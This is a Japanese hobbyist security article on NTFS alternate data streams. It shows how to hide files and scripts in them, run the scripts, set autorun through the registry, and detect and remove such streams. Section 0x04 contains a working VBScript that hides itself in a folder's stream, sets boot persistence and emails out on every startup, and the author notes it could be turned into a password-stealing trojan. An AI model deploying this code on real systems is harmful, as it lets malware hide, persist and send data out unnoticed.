@@ -1,0 +1,252 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: 見えないファイル、消せないファイル？ ～代替データストリーム---
+
+著者：PSY
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　見ることもできない、消すこともできない。検索はおろか、存在すら確認でき
+ない。なのにあらかじめ存在を知っていれば、閲覧も実行もできる。そんなファ
+イルの作り方をご存知だろうか。
+　NTFSファイルシステムには、代替データストリームなる機能が備えられている。
+わかりにくい名前だが、要はファイルにくっつけられる"おまけ情報"のようなも
+のだ（つまり正確には"ファイル"ではない）。目に見えるファイル（メインスト
+リームと呼ばれる）のほかに、プログラマがそのファイルの情報を格納するため
+の目に見えないストリームを複数ぶら下げることができるのである。代替データ
+ストリームは、Windowsのエクスプローラでもコマンドプロンプトでも存在確認で
+きないし、削除もできない。しかし作成は簡単にできるのだ。
+　今回は代替データストリームを使用する方法を紹介し、ウイルスなどのマルウ
+ェアでどのように悪用されているのかご紹介したいと思う。
+
+
+■0x02.) ファイルを隠してみよう
+
+　それでは、実際に代替データストリームを作成してみよう。作り方はしごく簡
+単。ファイル名の後にコロン(:)をつけるだけだ。
+
+1：テスト用のフォルダを作成する。ここでは仮にc:\testとする。
+
+2：コマンドプロンプト（ [スタートメニュー]->[ファイル名を指定して実行] で、
+"cmd"と入力）を立ち上げ、c:\testフォルダに移動し、テキストファイルを作成
+する。
+
+----
+c:\test>echo hello > test.txt
+----
+
+3：テスト用のファイルをダミーのテキストファイルの代替ストリームにコピーす
+る。
+
+----
+c:\test>type test.txt > dummy.txt:secret.txt
+----
+
+　dirコマンドで確認すると、サイズ0バイトのdummy.txtが作成されているはずだ。
+エクスプローラで確認してもサイズはやはり0バイト、dummy.txtの中身をノート
+パッドなどで開いても空っぽである。
+　しかし、確かにsecret.txtというストリームが出来ている証拠に、次のように
+コマンドラインからは打てば、ノートパッドでファイルの中身を確認することが
+できる。（ただしノートパッド上で [ファイル]->[開く] を選んでも、開くこと
+ができない）。
+
+----
+c:\>test>notepad dummy.txt:secret.txt
+----
+
+　なお、通常のコマンドでは削除は不可能である。ためしに次のように入力して
+みよう。
+
+----
+c:\>test>del dummy.txt:secret.txt
+----
+
+　エラーメッセージが表示されるはずだ。消したければ、dummy.txtごと削除する
+しかないのだ。
+
+　代替データストリームが存在するのに、ファイルサイズが0バイトなのは妙な気
+もするが、これは"代替"という名前のせいだろう。本来の目的は、あくまでファ
+イルの付随情報を記録しているだけなのである。
+　dummy.txtを右クリックして [プロパティ]->[概要] タブを開いてみよう。各項
+目に適当な文字を書き込んでも、dummy.txtのファイルサイズは0バイトのままだ。
+この概要も、代替データストリームに格納されている。ファイルについての説明
+を書き込んだだけで、ファイルサイズが変わってしまうのはやはり問題だろう。
+　作成できるのに削除できない仕様は奇異に感じるが。
+
+　面白いことに、代替ストリームは、ファイルでなくフォルダに対しても作成で
+きる。また、テキストだけでなく画像だろうとEXEファイルだろうと自由に格納で
+きるため、人目を避けたいファイルなどの一時置き場にも活用することも可能だ。
+
+
+■0x03.) マルウェアでの応用
+
+　見えない場所というと、当然のことながら悪さする輩の隠れ場所にもなってし
+まうものだ。Windows2000が発売されると早速この代替データストリームを利用す
+るウイルスが登場した。
+　世界初のストリームウイルスWin2k.Streamは、実行ファイルなどを代替データ
+ストリームにコピーしておき、ウイルス本体をメインストリームにコピーすると
+いうものだった。ウイルスが動作した後、代替ストリームに格納された本来のフ
+ァイルが実行されるため、ユーザは感染に気づきにくい。PEファイル本体に感染
+するのと異なり、実にお手軽に作れるウイルスだが、駆除は少々厄介だ。
+　またウイルス本体が代替データストリームに潜伏するというケースもある。見
+たことのないEXEやVBSファイルが増えていたらあからさまに怪しいが、フォルダ
+に付随する代替ストリームであれば、一見してファイルが増えたとはわからない。
+
+　ところでストリームに格納されたEXEファイルやスクリプトファイルを実行する
+にはどうしたらよいのだろうか？　これはstartコマンドで簡単に実現できる。
+
+----
+c:\test>mkdir test2
+c:\test>echo MsgBox"hello!" > c:\test\test2:s.vbs
+c:\test>start f:\test\test2:s.vbs
+----
+
+　1行目でディレクトリを作り、2行目でVBScriptのファイルを代替ストリームと
+して作成している。三行目でエンターキーを押すと、画面に"hello!"と書いたメ
+ッセージボックスが表示されたはずだ。
+
+　代替ストリームのファイルを、マシンの起動時に自動的に実行させることもで
+きる。多くのマルウェアは、以下のようなレジストリに自分のファイル名やパス
+を書き込んで、マシンが起動するたびに自動実行されるようにしている。
+
+----
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\run\
+----
+
+　ためしに代替ストリームとして格納したVBScriptを指定してみよう。レジスト
+リエディタを開き（ [スタートメニュー]->[ファイル名]を指定して実行] で、"
+regedit"と入力）、上記のキーを探す。右側のウィンドウペインの中で右クリッ
+クし、 [新規]->[文字列値] を選ぶ。任意の名前をつけ、データの部分に先ほど
+VBSを格納した場所"c:\test\test2:s.vbs"を入力すれば完了だ。いったんログオ
+フした後ログオンすれば、"hello!"のメッセージが表示されるはずだ。テストし
+た後は、レジストリを元に戻すのをお忘れなく。
+
+
+■0x04.) 監視ツールの作成
+
+　最後に今まで紹介したテクニックとVBScriptを使ってごく簡単な不可視（？）
+監視ツールを作ってみようと思う。
+　以下のVBSファイルをテスト用フォルダ内で実行すると、フォルダに潜伏（自身
+をフォルダの代替ストリームとしてコピー）し、自動実行されるようレジストリ
+に書き込む。次回から、マシンが起動するたびに、指定したメールアドレスへメ
+ールを送信するようになる。
+
+----
+Set oFSO = WScript.CreateObject("Scripting.FileSystemObject")
+
+'現在のボリュームがNTFSでなければ終了
+Set oDrive = oFSO.GetDrive(oFSO.GetDriveName(WScript.ScriptFullName)) 
+If oDrive.FileSystem <> "NTFS" Then
+ MsgBox "NTFSボリュームではないためインストールできません"
+ WScript.Quit
+End If
+
+'自分のファイル名を取得
+Set oMyself = oFSO.GetFile(WScript.ScriptFullName)
+sFileName = oMyself.Name
+sFolder = Left(oMyself.Path, Len(oMyself) - Len(sFileName) - 1)
+
+'代替ストリームからの起動でなければ、
+'自分が格納されているフォルダへ、自分自身を代替ストリームとしてコピー
+If InStr(sFileName, ":") = 0 Then
+ If Len(sFolder) = 2 Then
+  MsgBox("ルートフォルダから起動されています。フォルダ内で起動してください")
+  WScript.Quit
+ Else
+  sPath = sFolder + ":" + sFileName
+  oMyself.Copy(sPath)
+  oMyself.Delete
+  MsgBox(sPath + "に移動しました")
+ End If
+Else
+ sPath = oMyself
+End If
+
+'自動起動するようレジストリに書き込む
+Set oShell = WScript.CreateObject("WScript.Shell")
+If Err.Number = 0 Then
+ sRegPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\run\test"
+ oShell.RegWrite sRegPath, sPath, "REG_SZ"
+Else
+ MsgBox("レジストリが読み込めません")
+End If
+
+'メールの作成
+Set oMsg = WScript.CreateObject("CDO.Message")
+oMsg.From ="送信元メールアドレス"
+oMsg.To = "送信先メールアドレス"
+oMsg.Subject = "起動ログ"
+oMsg.TextBody = "マシンが起動されました" & vbCrLf & Now
+
+'以下は外部SMTPを利用する場合のみ設定
+'外部SMTPを利用する場合は、sendusingを2とする
+'oMsg.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
+'SMTPサーバのアドレス
+'oMsg.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "サーバのアドレス"
+'SMTPに利用するポート番号
+'oMsg.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = ポート番号
+
+'以下は、SMTPに認証が必要なサーバのみ設定
+'SMTP認証を利用
+'oMsg.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
+'アカウント名
+'oMsg.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusername") = "メールアカウント"
+'パスワード
+'oMsg.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "パスワード"
+
+oMsg.Send
+----
+
+　フォルダの代替ストリームに自分自身をコピーするので、テスト用フォルダの
+中で実行すること（そうでないと後で駆除が厄介になる）。またルートフォルダ
+で実行した場合はエラーとなる。実行する前に、送信元メールアドレス、送信先
+メールアドレスは自分のメールアドレスなどに変えるのをお忘れなく。またWind
+ows XP Professionalを使用しIISサービスのSMTPをインストールしている場合、
+直接メールを送信することができるが、インストールされていない環境や、SMTP
+送信が行えない環境（最近では、スパム防止対策のため、プロバイダがPort25か
+ら自社メールサーバ経由以外の送信を禁止しているケースがある）では、外部の
+SMTPサーバを利用する必要がある。この場合は「以下は外部SMTPを利用する場合
+のみ設定」と書かれた部分のプログラムをコメントアウトし、サーバのアドレス
+・ポート番号を自分が利用するものに変更すること。そのサーバがSMTP認証を行
+っている場合は「以下は、SMTPに認証が必要なサーバのみ設定」の下のプログラ
+ムもコメントアウトし、アカウント名とパスワードを自分のものに変更してほし
+い。テスト終了後は、レジストリを元に戻し、テスト用のフォルダごと削除する
+のを忘れずに。
+
+　上記は自分のマシンへ誰かが勝手にログインしていないかどうか監視するツー
+ルの例だ。ほんの少し応用すればイベントログをメール送信してくれる管理ツー
+ル、ターゲットマシンのパスワードファイルを添付ファイルとしてメール送信す
+るトロイの木馬、ファイルの中からメールアドレスらしき文字列を探し出して自
+身を添付し、感染を広げるワームなどなど、なんでも簡単に作れることがおわか
+りだろう。
+
+
+■0x05.) おわりに
+
+　ファイルの属性など格納するのに便利な代替データストリーム、面白い使い方
+もできるが、妙な使われ方をすると厄介なものにもなりうることもおわかりいた
+だけたかと思う。なにせ作成は可能なのに、閲覧・削除ができないのだから困り
+ものである。ウイルスなどに潜伏された日には、本体のファイルやフォルダまで
+犠牲にしなければならない。
+　確認・削除する方法がまったくないのかというと、もちろんそんなことはない。
+APIを使うとストリームの列挙が可能であり、代替ストリームの検出と削除を可能
+にする専用ツールもいくつか出回っている。
+
+・lfnutils (Long File Name Utilities) 
+http://www.monyo.com/technical/products/lfnutils/
+
+　また代替データストリームはNTFS独自の機能であるためにFDや非NTFSパーティ
+ションなどにコピーしようとすると、警告メッセージが表示されるので代替スト
+リームがあることがわかる。当然ながらFDにはメインストリームだけがコピーさ
+れる。
+
+　以上ちょっとした小技にすぎないが、活用するもしないも貴方次第、独自の発
+想こそハックの醍醐味だ。役に立つ／面白い使い方を思いつかれた方は、ぜひお
+知らせ願いたい。
+
+
